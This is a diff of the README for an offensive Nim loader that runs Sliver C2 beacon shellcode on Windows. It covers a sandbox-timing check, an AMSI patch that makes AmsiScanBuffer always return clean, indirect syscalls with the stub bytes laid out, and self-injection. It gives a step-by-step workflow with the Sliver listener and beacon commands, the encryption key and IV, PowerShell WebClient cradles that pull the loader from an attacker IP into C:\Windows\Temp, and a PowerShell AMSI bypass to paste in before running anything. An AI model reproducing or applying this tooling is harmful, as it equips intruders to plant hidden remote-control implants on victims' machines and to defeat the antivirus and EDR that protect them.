@@ -1,131 +1,202 @@
 # nimcrypt
 
-A Sliver shellcode loader written in Nim. Encrypts your Sliver beacon shellcode with AES-256-CBC before dropping it on disk, then decrypts and executes it in memory on the target, keeping the raw shellcode off disk and out of static analysis reach.
+A Sliver shellcode loader written in Nim targeting Windows x64. Two variants covering the two most common delivery situations. Tested against Windows Defender with real-time protection enabled.
 
-Tested against Windows Defender with real-time monitoring enabled.
+## Variants
 
-## How it works
+### stager
 
-### Encryption (your machine)
+Reads an encrypted shellcode blob from disk, decrypts it in memory, and self-injects. Use this when you already have a file drop primitive and want a small, simple binary.
 
-`encrypt.py` reads the raw shellcode and encrypts it with AES-256-CBC using a randomly generated 32-byte key and 16-byte IV. The encrypted blob is what gets transferred to the target. The shellcode never touches the target's disk in plaintext, so static analysis and on-write Defender scans see only ciphertext.
+```
+loader.exe <shellcode.bin> [key_hex iv_hex]
+```
 
-### Loader execution (target machine)
+Key and IV are optional. If omitted, the file is treated as raw unencrypted shellcode.
 
-The loader does the following at runtime:
+### stageless
 
-1. **Reads** the encrypted shellcode file from disk
-2. **Decrypts** it in memory using the Windows BCrypt API (AES-256-CBC). The key and IV are passed as arguments at runtime. They never exist in the binary itself
-3. **Allocates** a memory region with `VirtualAlloc` using `PAGE_READWRITE` permissions
-4. **Copies** the decrypted shellcode into that region
-5. **Changes** the memory permissions to `PAGE_EXECUTE_READ` via `VirtualProtect` — the region is now executable but no longer writable (RW → RX)
-6. **Executes** the shellcode by casting the memory address to a function pointer and calling it
+Downloads the encrypted blob from your C2 over a raw TCP socket, decrypts it in memory, and self-injects. No file ever touches disk. Use this when you can execute a binary on the target but cannot reliably drop a second file.
 
-The RW → RX transition is intentional. `PAGE_EXECUTE_READWRITE` (RWX) is a well-known red flag that Defender and EDRs specifically watch for. Allocating as RW first, writing the shellcode, then flipping to RX is the standard approach to avoid that signature.
+Edit the constants at the top of `stageless/loader.nim` before compiling:
 
-The decrypted shellcode only exists in memory for the duration of execution. It is never written back to disk.
+```nim
+c2Host = "C2_HOST"
+c2Port = 443'u16
+c2Path = "/payload.bin"
+scKey  = "..."   # 64 hex chars from encrypt.py
+scIV   = "..."   # 32 hex chars from encrypt.py
+```
+
+## Techniques
+
+### Sandbox evasion
+
+The stageless loader calls `Sleep(5000)` on startup and measures actual elapsed time with `GetTickCount64`. If less than 4500ms passed, the process exits. Most automated sandbox environments fast-forward or skip sleeps, causing the check to fail. This runs before any network activity or shellcode execution so sandboxes that inspect network behaviour see nothing.
+
+### AMSI bypass
+
+`amsi.nim` patches `AmsiScanBuffer` at runtime using two layers of obfuscation:
+
+**String hiding via FNV-1a hashing.** The string `AmsiScanBuffer` never appears in the binary. Instead, its FNV-1a hash is computed at compile time and stored as a constant. At runtime the loader walks amsi.dll's export table, hashes each export name, and compares against the stored value to find the function address without ever holding the string in memory.
+
+**Compile-time XOR obfuscation.** Both the DLL name (`amsi.dll`) and the patch bytes (`xor eax, eax; ret` = `31 C0 C3`) are XOR-encoded at compile time using a random key generated fresh each build via a Python subprocess. The key is embedded as a constant and the bytes are decoded at runtime immediately before use. The raw bytes change every build, breaking static signatures on the patch sequence.
+
+The patch overwrites the first three bytes of `AmsiScanBuffer` with `xor eax, eax; ret`, making every call return `AMSI_RESULT_CLEAN` regardless of input.
+
+### Payload encryption
+
+`encrypt.py` encrypts raw shellcode with AES-256-CBC using a randomly generated 32-byte key and 16-byte IV. The loader decrypts in-place using the Windows BCrypt API, so no third-party crypto library is needed on the target.
+
+### RW to RX memory transition
+
+Memory is allocated as `PAGE_READWRITE`, the shellcode is written into it, and then the region is flipped to `PAGE_EXECUTE_READ` before execution. Allocating directly as `PAGE_EXECUTE_READWRITE` is a well-known signature that Defender and EDRs flag explicitly. Separating the write and execute phases avoids that pattern.
+
+### Indirect syscalls (Hell's Gate + Halo's Gate)
+
+`stageless/syscalls.nim` bypasses both the Win32 API layer (kernel32.dll) and any ntdll.dll userland hooks placed by EDRs.
+
+**SSN resolution.** At startup the loader gets ntdll's base address and parses its PE export table, collecting every `Nt*` export sorted by RVA. For each NT function we need, it checks the first four bytes:
+
+- `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) means the stub is clean and the SSN is read directly from bytes 4-5. This is Hell's Gate.
+- Anything else means the function prologue has been patched by an EDR hook. In that case the loader walks neighbors in the sorted list until it finds a clean stub, then computes the target SSN as `neighbor_SSN +/- distance`. SSNs increment by one per stub in address order. This is Halo's Gate.
+
+**Gadget location.** The loader scans the first clean Nt* stub it finds for the byte sequence `0F 05 C3` (`syscall; ret`). This gives an address inside ntdll's image-backed `.text` section that we can reuse.
+
+**Stub generation.** For each required function a 22-byte stub is written into a single RW page that is flipped to RX before use:
+
+```
+4C 8B D1              mov r10, rcx
+B8 xx xx 00 00        mov eax, <SSN>
+FF 25 00 00 00 00     jmp qword ptr [rip+0]
+xx xx xx xx xx xx xx xx  gadget address
+```
+
+The `jmp [rip+0]` dereferences the 8 bytes immediately following it (the gadget address) and redirects execution into ntdll's existing `syscall; ret` sequence. The `syscall` instruction fires from ntdll's `.text` rather than from our anonymous allocation, defeating any kernel-level tracking of which memory region issued the syscall.
+
+The four functions covered by indirect syscalls are `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`, and `NtWaitForSingleObject`.
+
+### Self-injection
+
+After decryption, the stageless loader allocates a RW region in its own process via `NtAllocateVirtualMemory`, copies the shellcode in with `copyMem`, flips the region to RX via `NtProtectVirtualMemory`, and spawns a thread via `NtCreateThreadEx`. The main thread then blocks indefinitely on `NtWaitForSingleObject`, keeping the process alive while the beacon's goroutines run. All four calls go through the indirect syscall stubs described above.
+
+Self-injection keeps the call surface minimal. There are no cross-process API calls (`WriteProcessMemory`, `CreateRemoteThread`, etc.), which are the primary detection vectors for classic remote injection.
+
+## Execution flow (stageless)
+
+1. Timing check: sleep 5s, exit if elapsed < 4.5s
+2. AMSI patch: resolve `AmsiScanBuffer` via FNV-1a, overwrite with `xor eax, eax; ret`
+3. Resolve indirect syscall stubs: parse ntdll exports, find SSNs (Hell's Gate + Halo's Gate), locate `syscall; ret` gadget, write stubs
+4. Download: raw TCP socket, HTTP GET, strip headers, keep body
+5. Decrypt: AES-256-CBC via BCrypt in place
+6. Allocate: `NtAllocateVirtualMemory` in own process (RW) via indirect syscall
+7. Copy shellcode into the allocation
+8. Protect: `NtProtectVirtualMemory` to PAGE_EXECUTE_READ via indirect syscall
+9. Execute: `NtCreateThreadEx` via indirect syscall
+10. Wait: `NtWaitForSingleObject` on the thread handle via indirect syscall
+
+## Execution flow (stager)
+
+1. AMSI patch
+2. Read shellcode file from disk
+3. Decrypt if key and IV were provided
+4. `VirtualAlloc` (RW), copy shellcode, `VirtualProtect` to RX
+5. Execute via function pointer cast
 
 ## Requirements
 
-**On your Linux machine:**
+On your Linux build machine:
+
 - Nim + nimble (`nimble install winim`)
-- `x86_64-w64-mingw32-gcc` (mingw-w64)
+- mingw-w64 (`x86_64-w64-mingw32-gcc`)
 - Python 3 + pycryptodome (`pip install pycryptodome`)
 
 ## Full workflow
 
-### 1. Set up Sliver listener
+### 1. Start a Sliver listener
 
 ```
-[127.0.0.1] sliver > mtls --lhost 10.10.14.42 --lport 443
-
-[*] Starting mTLS listener ...
-[*] Successfully started job #1
+[server] sliver > mtls --lhost 10.10.14.42 --lport 443
 ```
 
 ### 2. Generate beacon shellcode
 
 ```
-[127.0.0.1] sliver > generate beacon --mtls 10.10.14.42:443 --os windows --arch amd64 --format shellcode --skip-symbols mssql
-
-[*] Generating new windows/amd64 beacon implant binary (1m0s)
-[!] Symbol obfuscation is disabled
-[*] Build completed in 2s
-[*] Implant saved to /path/to/WICKED_SLIDER.bin
+[server] sliver > generate beacon --mtls 10.10.14.42:443 --os windows --arch amd64 --format shellcode --skip-symbols beacon
 ```
 
-> `--skip-symbols` speeds up build time. `--format shellcode` is required. Do not use `--format exe`.
-
-### 3. Encrypt the shellcode
+### 3. Encrypt
 
 ```bash
-python3 encrypt.py WICKED_SLIDER.bin
-# [+] encrypted: WICKED_SLIDER_enc.bin (17875072 bytes)
-# [+] key: 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997
-# [+] iv:  83b82994e8c512d536f7d42e89d6e761
+python3 encrypt.py beacon.bin
+# key: 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997
+# iv:  83b82994e8c512d536f7d42e89d6e761
 ```
 
-Save the key and IV, you need them at runtime.
+### 4. Set constants and compile
 
-### 4. Compile the loader
+Edit `stageless/loader.nim` and set `c2Host`, `c2Port`, `c2Path`, `scKey`, `scIV`, then from the project root:
 
 ```bash
-nim c -d:release -o:loader.exe loader.nim
+# stageless
+nim c -d:release -o:bins/loader.exe stageless/loader.nim
+
+# stager
+nim c -d:release -o:bins/loader.exe stager/loader.nim
 ```
 
-The `nim.cfg` handles all cross-compilation flags automatically. The output is a statically linked Windows x64 PE with no external DLL dependencies beyond standard Windows system libraries.
+Always compile from the project root so that only the root `nim.cfg` is loaded. The output is a statically linked Windows x64 PE with no external DLL dependencies beyond standard system libraries.
 
-### 5. Transfer to target
+### 5. Serve or transfer
 
-Transfer `loader.exe` and `WICKED_SLIDER_enc.bin` to the target however you have access, certutil, PowerShell WebClient, SMB, etc.
+Stageless: serve the encrypted blob over HTTP on the port matching `c2Port`:
+
+```bash
+cd bins && python3 -m http.server 443
+```
+
+Stager: transfer both files to the target:
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile("http://10.10.14.42/loader.exe", "C:\Windows\Temp\loader.exe")
-(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/WICKED_SLIDER_enc.bin", "C:\Windows\Temp\beacon.bin")
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/beacon_enc.bin", "C:\Windows\Temp\beacon.bin")
 ```
 
 ### 6. Execute
 
+Stageless:
 ```
-loader.exe beacon.bin <key> <iv>
+loader.exe
 ```
 
-Example:
-
+Stager with encryption:
 ```
 loader.exe beacon.bin 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997 83b82994e8c512d536f7d42e89d6e761
 ```
 
-Raw unencrypted shellcode is also supported (no key/IV needed):
-
+Stager without encryption:
 ```
 loader.exe shellcode.bin
 ```
 
-## AMSI patch (PowerShell sessions)
+## PowerShell delivery
 
-If you are delivering via PowerShell rather than cmd, AMSI will scan your download cradle. Patch it first:
+If delivering via a PowerShell download cradle, AMSI will scan the script before the loader runs. Patch AMSI in your PS session first:
 
 ```bash
 python3 gen_amsi.py
 ```
 
-Paste the output into your PowerShell session before downloading or executing anything. A fresh randomized patch is generated on every run, with a different XOR key and byte arrays each time, so no two generated scripts share the same pattern.
-
-The patch works by:
-- Resolving `AmsiScanBuffer` via export table hash matching (FNV-1a, computed at compile time), the string never appears in the script
-- Patching via `WriteProcessMemory` on the current process, no `VirtualProtect` call needed
-- All strings (`amsi.dll`, `AmsiScanBuffer`, the C# P/Invoke definition) are XOR-encoded with the per-run random key
-
-> AMSI is irrelevant if you are executing `loader.exe` directly from cmd or xp_cmdshell. It only hooks script engines (PowerShell, JScript, .NET). Skip the patch in those cases.
+Paste the output into the PS session before downloading or executing anything. The script resolves `AmsiScanBuffer` by export table hash so the string never appears in plaintext, and all patch bytes are XOR-encoded with a random per-run key.
 
 ## Notes
 
-- The loader is statically linked against the mingw pthread runtime, no `libwinpthread-1.dll` required on the target
-- Requires Windows 10 / Server 2016+ (Universal CRT). Server 2012 R2 works with KB3118401 installed
-- `BCryptSetProperty` for chaining mode returns `STATUS_INVALID_PARAMETER` but BCrypt defaults to CBC anyway, decryption works correctly
+- Requires Windows 10 / Server 2016+ (Universal CRT)
+- `BCryptSetProperty` for chaining mode returns `STATUS_INVALID_PARAMETER` but BCrypt defaults to CBC regardless, decryption works correctly
+- Indirect syscalls cover only the four injection-critical NT functions. Winsock and BCrypt calls still go through their normal API paths, which is acceptable since those calls are behaviorally benign in isolation
+- The `syscall` instruction in the stubs fires from inside ntdll's `.text` section (image-backed, Microsoft-signed), not from the stub page, defeating kernel-level syscall origin tracking
 
 ## References
 
-- [gatariee/ldrgen](https://github.com/gatariee/ldrgen)
-- [D3Ext/Hooka](https://github.com/D3Ext/Hooka)
+- https://github.com/gatariee/ldrgen
+- https://github.com/D3Ext/Hooka
